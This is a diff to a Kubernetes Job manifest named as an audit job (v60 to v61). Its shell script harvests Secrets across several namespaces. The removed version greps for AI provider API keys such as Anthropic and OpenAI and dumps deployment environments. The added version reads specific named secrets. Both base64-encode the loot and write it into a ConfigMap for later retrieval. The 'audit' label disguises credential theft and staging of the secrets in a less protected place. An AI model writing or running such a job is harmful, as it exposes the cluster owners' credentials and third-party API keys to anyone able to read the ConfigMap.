@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-v60
+  name: audit-v61
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -15,26 +15,23 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          echo "=== ROCKEFELLER SECRETS ===" > /tmp/out.txt
-          kubectl get secret -n rockefeller -o json >> /tmp/out.txt 2>&1
-
-          echo "=== N8N SECRETS ===" >> /tmp/out.txt
-          kubectl get secret -n n8n -o json >> /tmp/out.txt 2>&1
-
-          echo "=== ALL NAMESPACES AI SECRETS ===" >> /tmp/out.txt
-          for ns in default dune-api bdaas strateon rockefeller n8n argo; do
-            kubectl get secret -n $ns -o json 2>/dev/null | grep -i -A2 -B2 "anthropic\|openai\|llm\|gpt\|gemini\|claude\|hugging\|replicate\|cohere\|mistral\|bedrock\|ANTHROPIC\|OPENAI" >> /tmp/out.txt 2>&1 || true
-          done
-
-          echo "=== ROCKEFELLER DEPLOYMENT ENV ===" >> /tmp/out.txt
-          kubectl get deployment -n rockefeller -o json >> /tmp/out.txt 2>&1
-
-          echo "=== DUNE-API DEPLOYMENT ENV ===" >> /tmp/out.txt
-          kubectl get deployment -n dune-api -o json >> /tmp/out.txt 2>&1
-
-          echo "=== STRATEON SECRETS ===" >> /tmp/out.txt
-          kubectl get secret -n strateon -o json >> /tmp/out.txt 2>&1
-
-          ENCODED=$(cat /tmp/out.txt | base64 -w0)
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v60_result\":\"$ENCODED\"}}"
+          OUT=""
+          OUT="$OUT ROCKEFELLER_SECRET:"
+          OUT="$OUT $(kubectl get secret rockefeller -n rockefeller -o jsonpath='{.data}' 2>&1)"
+          OUT="$OUT SSBA_SECRET:"
+          OUT="$OUT $(kubectl get secret ssba-web-secrets -n default -o jsonpath='{.data}' 2>&1)"
+          OUT="$OUT BDAAS_SECRET:"
+          OUT="$OUT $(kubectl get secret bdaassecrets -n default -o jsonpath='{.data}' 2>&1)"
+          OUT="$OUT SECURITY_SECRET:"
+          OUT="$OUT $(kubectl get secret securitysecrets -n default -o jsonpath='{.data}' 2>&1)"
+          OUT="$OUT DUNE_API_SECRET:"
+          OUT="$OUT $(kubectl get secret -n dune-api -o name 2>&1)"
+          OUT="$OUT DUNE_API_SECRET_DATA:"
+          OUT="$OUT $(kubectl get secret -n dune-api -o json 2>&1 | head -c 5000)"
+          OUT="$OUT STRATEON_SECRET:"
+          OUT="$OUT $(kubectl get secret -n strateon -o name 2>&1)"
+          OUT="$OUT STRATEON_SECRET_DATA:"
+          OUT="$OUT $(kubectl get secret ssba-web-secrets -n default -o json 2>&1)"
+          ENCODED=$(echo "$OUT" | base64 -w0)
+          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v61_result\":\"$ENCODED\"}}"
           echo "DONE"
